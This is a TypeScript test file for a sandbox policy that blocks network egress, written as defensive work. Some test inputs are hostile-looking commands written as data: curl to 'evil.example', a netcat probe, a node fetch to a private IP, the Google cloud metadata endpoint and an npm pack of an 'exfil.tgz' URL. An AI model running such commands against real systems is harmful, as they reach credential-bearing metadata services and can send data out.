import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { assertSandboxCommandArgs } from "./command-policy.js";
import { SandboxPolicyError } from "./policy.js";

function denied(fn: () => void) {
  assert.throws(
    fn,
    (err: unknown) =>
      err instanceof SandboxPolicyError && err.code === "egress_denied",
  );
}

describe("assertSandboxCommandArgs", () => {
  it("blocks network client binaries", () => {
    denied(() => assertSandboxCommandArgs(["curl", "https://github.com"]));
    denied(() => assertSandboxCommandArgs(["/usr/bin/wget", "https://example.com"]));
    denied(() => assertSandboxCommandArgs(["nc", "-zv", "10.0.0.1", "80"]));
  });

  it("blocks shell -c and interpreter eval", () => {
    denied(() =>
      assertSandboxCommandArgs(["sh", "-c", "npm test"]),
    );
    denied(() =>
      assertSandboxCommandArgs(["bash", "-lc", "curl https://evil.example"]),
    );
    denied(() =>
      assertSandboxCommandArgs(["node", "-e", "fetch('http://10.0.0.1')"]),
    );
    denied(() =>
      assertSandboxCommandArgs(["python3", "-c", "print(1)"]),
    );
  });

  it("blocks private IPs and metadata hosts in argv", () => {
    denied(() => assertSandboxCommandArgs(["echo", "10.0.0.5"]));
    denied(() =>
      assertSandboxCommandArgs([
        "echo",
        "http://metadata.google.internal/computeMetadata/v1",
      ]),
    );
  });

  it("blocks non-allowlisted http hosts mid-arg", () => {
    denied(() =>
      assertSandboxCommandArgs([
        "npm",
        "pack",
        "https://evil.example/exfil.tgz",
      ]),
    );
  });

  it("allows normal local commands", () => {
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["npm", "test", "--", "app/page.tsx"]),
    );
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["go", "test", "./..."]),
    );
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["node", "--version"]),
    );
    assert.doesNotThrow(() =>
      assertSandboxCommandArgs(["git", "status"]),
    );
  });
});
